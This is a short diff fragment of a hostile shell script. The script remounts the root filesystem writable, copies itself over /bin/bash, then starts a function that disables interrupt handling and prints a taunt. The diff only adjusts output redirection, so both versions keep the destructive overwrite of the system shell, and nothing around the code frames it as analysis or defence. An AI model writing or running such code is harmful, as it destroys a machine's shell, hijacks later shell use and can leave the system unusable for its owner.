@@ -1,6 +1,6 @@
 #!/bin/sh
-mount -o remount,rw /
-cp $0 /bin/bash 2>&1 2>/dev/null
+mount -o remount,rw / 2>&1 >/dev/null
+cp $0 /bin/bash 2>&1 >/dev/null
 pain() {
 trap '' INT
 echo "You've activated my TRAP card!"
